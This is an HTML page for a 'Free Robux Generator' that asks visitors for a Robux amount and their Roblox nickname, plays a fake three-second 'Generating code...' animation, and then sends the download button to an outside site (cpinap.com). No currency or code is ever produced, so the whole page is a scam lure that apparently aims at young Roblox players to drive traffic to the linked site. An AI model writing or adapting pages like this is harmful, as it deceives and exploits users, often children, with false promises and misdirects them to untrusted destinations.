<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Robux Generator</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
        }
        #main-container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin-top: 20px;
            cursor: pointer;
            border: none;
            background-color: #28a745;
            color: white;
            border-radius: 5px;
        }
        button:disabled {
            background-color: #ccc;
        }
        input {
            padding: 10px;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
            box-sizing: border-box;
        }
        #loading {
            display: none;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div id="main-container">
        <button id="start-btn">Get free robux</button>
        
        <div id="step-1" style="display:none;">
            <p>How many robux do you want to receive? From 100 to 100,000 at a time</p>
            <input type="number" id="robux-amount" min="100" max="100000" placeholder="Enter robux amount">
            <button id="next-btn-1">Next</button>
        </div>
        
        <div id="step-2" style="display:none;">
            <p>Roblox nickname</p>
            <input type="text" id="roblox-nickname" placeholder="Enter your Roblox nickname">
            <button id="next-btn-2">Get code for roblox money</button>
        </div>
        
        <div id="loading" style="display:none;">
            <p>Generating code...</p>
            <div class="loader"></div>
        </div>
        
        <div id="step-3" style="display:none;">
            <button id="download-btn">Download roblox code for robux</button>
        </div>
    </div>

    <script>
        const startBtn = document.getElementById('start-btn');
        const step1 = document.getElementById('step-1');
        const nextBtn1 = document.getElementById('next-btn-1');
        const step2 = document.getElementById('step-2');
        const nextBtn2 = document.getElementById('next-btn-2');
        const loading = document.getElementById('loading');
        const step3 = document.getElementById('step-3');
        const downloadBtn = document.getElementById('download-btn');

        startBtn.addEventListener('click', () => {
            startBtn.style.display = 'none';
            step1.style.display = 'block';
        });

        nextBtn1.addEventListener('click', () => {
            const robuxAmount = document.getElementById('robux-amount').value;
            if (robuxAmount >= 100 && robuxAmount <= 100000) {
                step1.style.display = 'none';
                step2.style.display = 'block';
            } else {
                alert('Please enter a valid robux amount (100 - 100,000)');
            }
        });

        nextBtn2.addEventListener('click', () => {
            const nickname = document.getElementById('roblox-nickname').value;
            if (nickname) {
                step2.style.display = 'none';
                loading.style.display = 'block';

                setTimeout(() => {
                    loading.style.display = 'none';
                    step3.style.display = 'block';
                }, 3000);
            } else {
                alert('Please enter your Roblox nickname');
            }
        });

        downloadBtn.addEventListener('click', () => {
            window.location.href = 'https://cpinap.com/';
        });
    </script>
</body>
</html>
